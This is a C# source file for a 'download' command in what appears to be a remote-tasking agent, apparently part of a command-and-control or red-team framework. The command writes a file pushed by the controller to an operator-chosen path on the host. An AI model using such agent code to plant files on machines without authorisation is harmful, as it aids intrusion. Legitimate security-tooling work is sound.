using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class DownloadCommand : AgentCommand
    {
        public override string Name => "download";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            string fileName = file.Name;

            if (task.SplittedArgs.Count() > 0)
            {
                fileName = task.SplittedArgs[0];
            }

            var fileContent = file.GetFileContent();

            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
            {
                fs.Write(fileContent, 0, fileContent.Length);
            }

            context.Result.Result = $"File downloaded to {fileName}." + Environment.NewLine;
        }
    }
}
